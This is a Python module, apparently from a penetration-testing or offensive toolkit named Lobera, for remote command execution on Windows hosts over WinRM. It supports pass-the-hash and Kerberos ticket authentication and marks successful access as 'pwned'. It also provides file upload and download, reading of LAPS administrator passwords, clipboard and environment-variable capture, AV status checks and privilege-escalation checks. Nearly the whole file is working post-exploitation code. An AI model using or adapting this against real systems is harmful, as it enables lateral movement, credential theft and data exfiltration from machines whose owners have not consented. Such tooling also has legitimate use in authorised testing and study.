# modules/winrm.py
#
# WinRMModule — ejecución remota de PowerShell/cmd vía WinRM (MS-WSMV).
#
# Protocolos:
#   Puerto 5985 (HTTP)  — WS-Management sobre HTTP
#   Puerto 5986 (HTTPS) — WS-Management sobre HTTPS
#
# Autenticación soportada:
#   - NTLM (user + password)
#   - Pass-the-Hash (NT hash) — usando winrm con auth NTLM y hash directo
#   - Kerberos (ccache) — KRB5CCNAME en el entorno
#
# Dependencia principal: pywinrm  (pip install pywinrm --break-system-packages)
# Fallback para Kerberos: impacket WinRM transport

import os
import ssl
import socket
from core.output import print_result, print_check, print_table, console
from core import session_db


# ---------------------------------------------------------------------------
# Constantes
# ---------------------------------------------------------------------------

DEFAULT_PORT_HTTP  = 5985
DEFAULT_PORT_HTTPS = 5986
WINRM_TIMEOUT      = 30   # segundos (operaciones PS pueden tardar)


# ---------------------------------------------------------------------------
# WinRMModule
# ---------------------------------------------------------------------------

class WinRMModule:
    """
    Módulo WinRM de Lobera.

    Uso:
        w = WinRMModule(target, creds, use_ssl=False)
        if w.connect():
            result = w.run_cmd("whoami")
            result = w.run_ps("Get-Process | Select-Object Name,Id")
    """

    def __init__(self, target, creds, use_ssl=False, port=None):
        self.target  = target
        self.creds   = creds
        self.use_ssl = use_ssl
        self.port    = port or (DEFAULT_PORT_HTTPS if use_ssl else DEFAULT_PORT_HTTP)
        self._session = None    # winrm.Session o equivalente
        self._proto   = "WINRM"

    # ------------------------------------------------------------------
    # Conexión
    # ------------------------------------------------------------------

    def connect(self):
        """
        Establece la sesión WinRM.
        Retorna True si tiene éxito.
        """
        try:
            import winrm
            from winrm.exceptions import WinRMTransportError, WinRMOperationTimeoutError

            scheme = "https" if self.use_ssl else "http"
            target_host = self.target.hostname or self.target.ip

            # Construir endpoint
            endpoint = "{}://{}:{}/wsman".format(scheme, target_host, self.port)

            if self.creds.ccache:
                # Kerberos via ccache
                os.environ["KRB5CCNAME"] = self.creds.ccache
                self._session = winrm.Session(
                    endpoint,
                    auth=(self.creds.user, ""),
                    transport="kerberos",
                    server_cert_validation="ignore",
                    read_timeout_sec=WINRM_TIMEOUT,
                    operation_timeout_sec=WINRM_TIMEOUT - 5,
                )
                auth_type = "Kerberos (ccache)"

            elif self.creds.hash:
                # Pass-the-Hash via NTLM — pywinrm soporta NT hash directamente
                # en el campo password cuando el transport es ntlm y se pasa
                # como ":NThash" (formato lm:nt con lm vacío)
                nt_hash = self.creds.hash.split(":")[-1]
                self._session = winrm.Session(
                    endpoint,
                    auth=(self.creds.user, ":{}".format(nt_hash)),
                    transport="ntlm",
                    server_cert_validation="ignore",
                    read_timeout_sec=WINRM_TIMEOUT,
                    operation_timeout_sec=WINRM_TIMEOUT - 5,
                )
                auth_type = "NTLM (hash)"

            else:
                # Password normal — preferimos NTLM sobre Basic
                transport = "ntlm" if self.creds.user else "basic"
                self._session = winrm.Session(
                    endpoint,
                    auth=(self.creds.user, self.creds.password),
                    transport=transport,
                    server_cert_validation="ignore",
                    read_timeout_sec=WINRM_TIMEOUT,
                    operation_timeout_sec=WINRM_TIMEOUT - 5,
                )
                auth_type = "NTLM" if transport == "ntlm" else "Basic"

            # Test rápido de conectividad (whoami)
            resp = self._session.run_cmd("whoami")
            if resp.status_code == 0:
                whoami = resp.std_out.decode(errors="replace").strip()
                print_result(self._proto, self.target.ip, "pwned",
                             "WinRM conectado ({}) — {}".format(auth_type, whoami))
                session_db.save_target(self.target.ip,
                                       hostname=self.target.hostname,
                                       domain=self.target.domain)
                session_db.save_finding(
                    self.target.ip, "WINRM", "auth_ok",
                    "auth={} user={}".format(auth_type, self.creds.user),
                )
                return True
            else:
                err = resp.std_err.decode(errors="replace").strip()
                print_result(self._proto, self.target.ip, "fail",
                             "Conectado pero test falló: {}".format(err[:100]))
                return False

        except ImportError:
            print_result(self._proto, self.target.ip, "fail",
                         "pywinrm no instalado: pip install pywinrm --break-system-packages")
            return False
        except Exception as exc:
            print_result(self._proto, self.target.ip, "fail",
                         "No se pudo conectar a WinRM: {}".format(exc))
            return False

    def disconnect(self):
        self._session = None

    # ------------------------------------------------------------------
    # Ejecución de comandos
    # ------------------------------------------------------------------

    def run_cmd(self, command, silent=False):
        """
        Ejecuta un comando cmd.exe y devuelve dict:
          {stdout, stderr, status_code, success}
        """
        if not self._session:
            print_result(self._proto, self.target.ip, "fail",
                         "Sin sesión activa — llama a connect() primero")
            return {"stdout": "", "stderr": "", "status_code": -1, "success": False}
        try:
            resp = self._session.run_cmd(command)
            stdout = resp.std_out.decode(errors="replace").strip()
            stderr = resp.std_err.decode(errors="replace").strip()
            ok     = resp.status_code == 0

            if not silent:
                if stdout:
                    console.print(stdout)
                if stderr:
                    console.print(f"[red]{stderr}[/red]")

            return {"stdout": stdout, "stderr": stderr,
                    "status_code": resp.status_code, "success": ok}
        except Exception as exc:
            if not silent:
                print_result(self._proto, self.target.ip, "fail", str(exc))
            return {"stdout": "", "stderr": str(exc), "status_code": -1, "success": False}

    def run_ps(self, script, silent=False):
        """
        Ejecuta un script PowerShell y devuelve dict igual que run_cmd.
        El script se codifica en Base64 para evitar problemas de escape.
        """
        if not self._session:
            print_result(self._proto, self.target.ip, "fail",
                         "Sin sesión activa — llama a connect() primero")
            return {"stdout": "", "stderr": "", "status_code": -1, "success": False}
        try:
            resp = self._session.run_ps(script)
            stdout = resp.std_out.decode(errors="replace").strip()
            stderr = resp.std_err.decode(errors="replace").strip()
            ok     = resp.status_code == 0

            if not silent:
                if stdout:
                    console.print(stdout)
                if stderr:
                    console.print(f"[red]{stderr}[/red]")

            return {"stdout": stdout, "stderr": stderr,
                    "status_code": resp.status_code, "success": ok}
        except Exception as exc:
            if not silent:
                print_result(self._proto, self.target.ip, "fail", str(exc))
            return {"stdout": "", "stderr": str(exc), "status_code": -1, "success": False}

    def upload_file(self, local_path, remote_path):
        """
        Sube un fichero local al objetivo vía WinRM (base64 chunk encoding).
        Retorna True si tiene éxito.
        """
        try:
            import base64
            with open(local_path, "rb") as f:
                data = f.read()
            b64 = base64.b64encode(data).decode()

            # PowerShell: decodificar base64 y escribir fichero
            ps = (
                '$bytes = [Convert]::FromBase64String("{}"); '
                '[IO.File]::WriteAllBytes("{}", $bytes)'
            ).format(b64, remote_path)

            result = self.run_ps(ps, silent=True)
            if result["success"]:
                print_result(self._proto, self.target.ip, "ok",
                             "Subido: {} → {}".format(local_path, remote_path))
                session_db.save_finding(
                    self.target.ip, "WINRM", "file_uploaded",
                    "{} → {}".format(local_path, remote_path),
                )
                return True
            else:
                print_result(self._proto, self.target.ip, "fail",
                             "Upload fallido: {}".format(result["stderr"][:100]))
                return False
        except Exception as exc:
            print_result(self._proto, self.target.ip, "fail",
                         "Upload error: {}".format(exc))
            return False

    def download_file(self, remote_path, local_path):
        """
        Descarga un fichero remoto vía WinRM (base64 encoding).
        """
        try:
            import base64, os
            ps = '[Convert]::ToBase64String([IO.File]::ReadAllBytes("{}"))'.format(remote_path)
            result = self.run_ps(ps, silent=True)
            if not result["success"]:
                print_result(self._proto, self.target.ip, "fail",
                             "Download fallido: {}".format(result["stderr"][:100]))
                return False

            data = base64.b64decode(result["stdout"].strip())
            os.makedirs(os.path.dirname(local_path) or ".", exist_ok=True)
            with open(local_path, "wb") as f:
                f.write(data)

            print_result(self._proto, self.target.ip, "ok",
                         "Descargado: {} → {} ({} bytes)".format(
                             remote_path, local_path, len(data)))
            session_db.save_finding(
                self.target.ip, "WINRM", "file_downloaded",
                "{} → {}".format(remote_path, local_path),
            )
            return True
        except Exception as exc:
            print_result(self._proto, self.target.ip, "fail",
                         "Download error: {}".format(exc))
            return False

    # ------------------------------------------------------------------
    # Enumeración de alto nivel
    # ------------------------------------------------------------------

    def get_sysinfo(self):
        """Información básica del sistema."""
        ps = """
$info = @{
    Hostname       = $env:COMPUTERNAME
    Username       = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    OS             = (Get-WmiObject Win32_OperatingSystem).Caption
    OSVersion      = [System.Environment]::OSVersion.Version.ToString()
    Architecture   = $env:PROCESSOR_ARCHITECTURE
    Domain         = $env:USERDOMAIN
    PSVersion      = $PSVersionTable.PSVersion.ToString()
    Uptime         = (Get-Date) - (gcim Win32_OperatingSystem).LastBootUpTime
    TotalRAM_GB    = [math]::Round((gcim Win32_PhysicalMemory | Measure-Object Capacity -Sum).Sum / 1GB, 2)
}
$info.GetEnumerator() | ForEach-Object { "$($_.Key): $($_.Value)" }
"""
        result = self.run_ps(ps, silent=True)
        if not result["success"]:
            return {}
        info = {}
        for line in result["stdout"].splitlines():
            if ": " in line:
                k, v = line.split(": ", 1)
                info[k.strip()] = v.strip()
        session_db.save_finding(
            self.target.ip, "WINRM", "sysinfo",
            "host={} os={}".format(
                info.get("Hostname",""), info.get("OS","")[:40]),
        )
        return info

    def get_local_users(self):
        """Lista usuarios locales y su estado."""
        ps = "Get-LocalUser | Select-Object Name,Enabled,LastLogon,Description | Format-Table -AutoSize"
        return self.run_ps(ps)

    def get_local_groups(self):
        """Lista grupos locales con miembros."""
        ps = "Get-LocalGroup | Select-Object Name,Description | Format-Table -AutoSize"
        return self.run_ps(ps)

    def get_local_admins(self):
        """Miembros del grupo Administrators local."""
        ps = "Get-LocalGroupMember -Group Administrators | Select-Object Name,ObjectClass,PrincipalSource | Format-Table -AutoSize"
        return self.run_ps(ps)

    def get_processes(self):
        """Lista procesos (Id, Nombre, Usuario)."""
        ps = "Get-Process | Select-Object Id,ProcessName,@{N='User';E={(Get-Process -Id $_.Id -IncludeUserName -ErrorAction SilentlyContinue).UserName}} | Sort-Object ProcessName | Format-Table -AutoSize"
        return self.run_ps(ps)

    def get_network_info(self):
        """Adaptadores, IPs, rutas y conexiones activas."""
        ps = """
Write-Host '--- Adaptadores ---'
Get-NetIPAddress | Select-Object InterfaceAlias,IPAddress,PrefixLength | Format-Table -AutoSize
Write-Host '--- Rutas ---'
Get-NetRoute | Where-Object DestinationPrefix -ne '0.0.0.0/0' | Select-Object DestinationPrefix,NextHop,RouteMetric | Format-Table -AutoSize
Write-Host '--- Conexiones activas ---'
Get-NetTCPConnection -State Established | Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess | Format-Table -AutoSize
"""
        return self.run_ps(ps)

    def get_scheduled_tasks(self):
        """Tareas programadas habilitadas con su acción."""
        ps = "Get-ScheduledTask | Where-Object State -eq 'Ready' | Select-Object TaskName,TaskPath,@{N='Action';E={$_.Actions.Execute}} | Format-Table -AutoSize"
        return self.run_ps(ps)

    def get_services(self):
        """Lista servicios con ruta del ejecutable."""
        ps = "Get-WmiObject Win32_Service | Select-Object Name,State,StartMode,PathName | Sort-Object State | Format-Table -AutoSize"
        return self.run_ps(ps)

    def get_installed_software(self):
        """Software instalado vía registro."""
        ps = """
$paths = @(
    'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*',
    'HKLM:\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*'
)
Get-ItemProperty $paths | Where-Object DisplayName | Select-Object DisplayName,DisplayVersion,Publisher | Sort-Object DisplayName | Format-Table -AutoSize
"""
        return self.run_ps(ps)

    def get_av_status(self):
        """Estado del antivirus/Defender."""
        ps = """
try {
    Get-MpComputerStatus | Select-Object AMRunningMode,AntivirusEnabled,RealTimeProtectionEnabled,
        BehaviorMonitorEnabled,IoavProtectionEnabled,AntivirusSignatureLastUpdated | Format-List
} catch {
    Write-Host 'Windows Defender no disponible o sin permisos'
}
Write-Host '--- Productos AV registrados ---'
Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct |
    Select-Object displayName,productState | Format-Table -AutoSize
"""
        return self.run_ps(ps)

    def get_laps_password(self, computer=None):
        """
        Intenta leer la contraseña LAPS del equipo local o de uno especificado.
        Requiere permisos para leer ms-MCS-AdmPwd.
        """
        target = computer or "$env:COMPUTERNAME"
        ps = """
try {{
    $pw = Get-ADComputer {target} -Properties ms-Mcs-AdmPwd | Select-Object -ExpandProperty ms-Mcs-AdmPwd
    if ($pw) {{ Write-Host "LAPS password: $pw" }} else {{ Write-Host "LAPS no configurado o sin permisos" }}
}} catch {{
    Write-Host "Error: $_"
}}
""".format(target=target)
        return self.run_ps(ps)

    def get_clipboard(self):
        """Captura el contenido del portapapeles."""
        ps = "Get-Clipboard"
        return self.run_ps(ps)

    def get_env_vars(self):
        """Variables de entorno (pueden contener credenciales)."""
        ps = "Get-ChildItem Env: | Format-Table -AutoSize"
        return self.run_ps(ps)

    def check_privesc(self):
        """
        Ejecuta comprobaciones básicas de privesc:
        - AlwaysInstallElevated
        - Unquoted service paths
        - Writable paths en PATH del sistema
        - SeImpersonate en el token actual
        """
        ps = r"""
Write-Host '--- AlwaysInstallElevated ---'
$aie_hklm = (Get-ItemProperty 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
$aie_hkcu = (Get-ItemProperty 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name AlwaysInstallElevated -ErrorAction SilentlyContinue).AlwaysInstallElevated
if ($aie_hklm -eq 1 -and $aie_hkcu -eq 1) { Write-Host 'VULNERABLE: AlwaysInstallElevated activo' } else { Write-Host 'No vulnerable' }

Write-Host ''
Write-Host '--- Unquoted Service Paths ---'
Get-WmiObject Win32_Service | Where-Object {
    $_.PathName -notlike '"*' -and $_.PathName -like '* *'
} | Select-Object Name,PathName | Format-Table -AutoSize

Write-Host ''
Write-Host '--- Privilegios del token actual ---'
whoami /priv | Select-String -Pattern 'SeImpersonatePrivilege|SeDebugPrivilege|SeBackupPrivilege|SeAssignPrimaryToken'

Write-Host ''
Write-Host '--- Directorios escribibles en PATH ---'
($env:PATH).Split(';') | ForEach-Object {
    try {
        $acl = Get-Acl $_ -ErrorAction Stop
        $writable = $acl.Access | Where-Object {
            $_.IdentityReference -match 'Everyone|Users|Authenticated' -and
            $_.FileSystemRights -match 'Write|FullControl'
        }
        if ($writable) { Write-Host "ESCRIBIBLE: $_" }
    } catch {}
}
"""
        return self.run_ps(ps)

    def check_winrm_enabled_on_target(self):
        """
        Comprueba si WinRM está habilitado y qué autenticaciones acepta
        antes de autenticarse (sondeo del banner HTTP).
        """
        try:
            scheme = "https" if self.use_ssl else "http"
            host   = self.target.hostname or self.target.ip
            url    = "{}://{}:{}/wsman".format(scheme, host, self.port)

            import urllib.request, urllib.error
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE

            try:
                req = urllib.request.Request(url, method="OPTIONS")
                with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
                    headers = dict(resp.headers)
                    print_result(self._proto, self.target.ip, "ok",
                                 "WinRM responde en puerto {} ({})".format(
                                     self.port, scheme.upper()))
                    auth_methods = headers.get("WWW-Authenticate", "-")
                    print_check("Métodos de auth: {}".format(auth_methods), ok=True)
                    session_db.save_finding(
                        self.target.ip, "WINRM", "winrm_enabled",
                        "port={} auth={}".format(self.port, auth_methods),
                    )
                    return True
            except urllib.error.HTTPError as e:
                if e.code == 405:  # Method Not Allowed = WinRM activo
                    print_result(self._proto, self.target.ip, "ok",
                                 "WinRM activo (HTTP 405 en OPTIONS)")
                    session_db.save_finding(
                        self.target.ip, "WINRM", "winrm_enabled",
                        "port={}".format(self.port),
                    )
                    return True
                elif e.code == 401:
                    auth = e.headers.get("WWW-Authenticate", "-")
                    print_result(self._proto, self.target.ip, "ok",
                                 "WinRM activo — requiere auth ({})".format(auth))
                    session_db.save_finding(
                        self.target.ip, "WINRM", "winrm_enabled",
                        "port={} auth={}".format(self.port, auth),
                    )
                    return True
                raise
        except Exception as exc:
            print_result(self._proto, self.target.ip, "fail",
                         "WinRM no responde en puerto {}: {}".format(self.port, exc))
            return False
